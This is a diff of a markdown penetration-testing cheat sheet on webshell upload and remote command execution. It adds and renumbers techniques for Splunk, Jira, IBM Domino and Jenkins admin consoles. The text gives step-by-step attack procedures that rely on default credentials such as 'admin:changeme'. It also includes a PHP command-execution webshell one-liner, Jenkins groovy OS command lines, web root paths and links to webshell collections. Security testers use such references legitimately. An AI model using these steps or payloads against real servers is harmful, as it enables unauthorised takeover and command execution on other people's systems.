@@ -3,7 +3,6 @@
 ### INDEX
 ```
 I. Classic Webshell upload techniques
-
    ➤ Technique 1. Webshell upload using a PHPMyAdmin Web console
    ➤ Technique 2. Webshell upload using an Apache Tomcat manager Web console
    ➤ Technique 3. Webshell upload using a JBoss administration JMX Web console
@@ -18,17 +17,20 @@ I. Classic Webshell upload techniques
    ➤ Technique 12. Webshell upload by exploiting a remote OS command execution vulnerability
    ➤ Technique 13. Webshell upload by exploiting a remote code execution (RCE) vulnerability (e.g. insecure deserialization, )
    ➤ Technique 14. Webshell upload by exploiting an insecure CKEditor (WYSIWYG HTML Editor with Collaborative Rich Text Editing)
-   ➤ Technique 15. Webshell upload using a Lotus Domino administration console
-   ➤ Technique 16. Webshell upload using a Splunk administration console
-   ➤ Technique 17. Webshell upload using a Jira administration console
-   ➤ Technique 18. Webshell upload using a Jenkins administration console
-   ➤ Technique 19. ...
+   ➤ Technique 15. Webshell upload using a Splunk administration console
+   ➤ Technique 16. Webshell upload using a Jira administration console
+   ➤ Technique 17. ...
 
-II. List of common paths for the DocumentRoot directory (Web root folder)
+II. Classic Web RCE techniques
+   ➤ Technique 1. RCE using an IBM Domino Web administration console
+   ➤ Technique 2. RCE using a Jenkins web-based groovy script console
+   ➤ Technique 3. ...
 
-III. Usefull Github links for Webshells
+III. List of common paths for the DocumentRoot directory (Web root folder)
 
-IV. Quickly set up a test environment using Docker
+IV.  Usefull Github links for Webshells
+
+V.  Quickly set up a test environment using Docker
 ```
 
 ### I. Classic Webshell upload techniques
@@ -536,37 +538,60 @@ Note: Several PHP functions can be used in a webshell to execute OS commands suc
 + exec() function: <?php echo exec($_POST['cmd']); ?>
 ```
 
-#### Technique 16 - Webshell upload  using a Splunk administration console
+#### Technique 15 - Webshell upload using a Splunk administration console
 ```
 ➤ Step 1. Download a Webshell customized for Splunk
-  - https://github.com/dionach/Splunk-Web-Shell
-  - https://github.com/TBGSecurity/splunk_shells
+	   - https://github.com/dionach/Splunk-Web-Shell
+	   - https://github.com/TBGSecurity/splunk_shells
 
 ➤ Step 2. Log into the administrator portal of a Splunk instance (e.g. admin access is uncredentialed or default creds 'admin:changeme' have not been changed)
-  - http://IP-splunk:8000/ or  https://IP-splunk:8000/ 
+	   - http://IP-splunk:8000/ or  https://IP-splunk:8000/ 
 
 ➤ Step 3. To deploy the Webshell you have to:
-  - browse to "Manage Apps" and then click on "Install app from file", 
-  - click on "Choose File", select the "webShell.tar.gz" file and click on "Upload"
-  - click on "Restart Splunk"
-  - browse the new app (your Webshell)
+	   - browse to "Manage Apps" and then click on "Install app from file", 
+	   - click on "Choose File", select the "webShell.tar.gz" file and click on "Upload"
+	   - click on "Restart Splunk"
+	   - browse the new app (your Webshell)
 ```
 
-#### Technique 17 - Webshell upload  using a Jira administration console
+#### Technique 16 - Webshell upload using a Jira administration console
 ```
 ➤ Step 1. Download a Webshell customized for Jira
-  - https://github.com/dubfr33/atlassian-webshell-plugin
+	   - https://github.com/dubfr33/atlassian-webshell-plugin
 
 ➤ Step 2. Log into a Jira instance as an administrator (e.g. default admin creds 'admin:admin' have not been changed)
-  - http://IP-or-Url/login.jsp or https://IP-or-Url/login.jsp 
+	   - http://IP-or-Url/login.jsp or https://IP-or-Url/login.jsp 
 
 ➤ Step 3. To deploy the Webshell you have to:
-  - browse the upload page "https://IP-or-Url/plugins/servlet/upm"
-  - then upload the Webshell plugin "atlassian-webshell-plugin\atlplug.jar"
-  - finally access the Webshell to execute system command "https://IP-or-Url/plugins/servlet/com.jsos.shell/ShellServlet"
+	   - browse the upload page "https://IP-or-Url/plugins/servlet/upm"
+	   - then upload the Webshell plugin "atlassian-webshell-plugin\atlplug.jar"
+	   - finally access the Webshell to execute system command "https://IP-or-Url/plugins/servlet/com.jsos.shell/ShellServlet"
 ```
 
-### II. List of common paths for the DocumentRoot directory (Web root folder)
+### II. Classic Web RCE techniques
+#### Technique 1 - RCE using an IBM Domino Web administration console
+```
+➤ Step 1. Log into the IBM Domino Web Administrator console and browse the Web Administrator database named "webadmin.nsf"
+	   - https://target-IP-or-Url/webadmin.nsf
+➤ Step 2. Click on "Server" and then "Status" 
+➤ Step 3. Select "Quick Console" (or "Live Console")
+➤ Step 4. Enter the OS command with any arguments directly in the "Domino Command" box and then click "Send"
+```
+
+#### Technique 2 - RCE using a Jenkins web-based groovy script console
+```
+➤ Step 1. Log into a Jenkins Web console with admin privileges (e.g. admin access is uncredentialed or whith default admin credentials 'admin:password' have not been changed)
+
+➤ Step 2. Browse the Jenkins web-based groovy script console that allows to execute OS commands on the underlying Windows server.
+	   - https://target-IP-or-Url/jenkins/script
+
+➤ Step 3. Execute OS command using the groovy script console in jenkins
+           Basic examples:
+	   - print "cmd /c whoami >> C:\\Temp\\test.txt".execute().text   	//for a Windows server
+	   - print "ls /".execute().text					//for a Linux server
+```
+
+### III. List of common paths for the DocumentRoot directory (Web root folder)
 ```
 ➤ XAMP (Windows) = "c:\XAMPP\htdocs"
 ➤ IIS (Windows) = "C:\inetpub\wwwroot"
@@ -578,7 +603,7 @@ Note: Several PHP functions can be used in a webshell to execute OS commands suc
 ➤ NGINX (Linux) = '/data/www' or '/data/w3' or "/usr/local/nginx/html' (configuration files can be found in the directory: '/usr/local/nginx/conf' or /etc/nginx' or '/usr/local/etc/nginx')
 ```
 
-### III. Usefull Github links for Webshells
+### IV Usefull Github links for Webshells
 ```
 ➤ ASPX Webshell - https://github.com/tennc/webshell/tree/master/aspx/asp.net-backdoors
 ➤ ASP Webshell  - https://github.com/tennc/webshell/tree/master/fuzzdb-webshell/asp
@@ -590,7 +615,7 @@ Note: Several PHP functions can be used in a webshell to execute OS commands suc
 ➤ Memory WebShell Generator - https://github.com/hosch3n/msmap
 ```
 
-### IV. Quickly set up a test environment using Docker
+### V. Quickly set up a test environment using Docker
 #### Docker can be used to quickly set up a testing environment (https://hub.docker.com/search?q=)
 ```
 For examples:
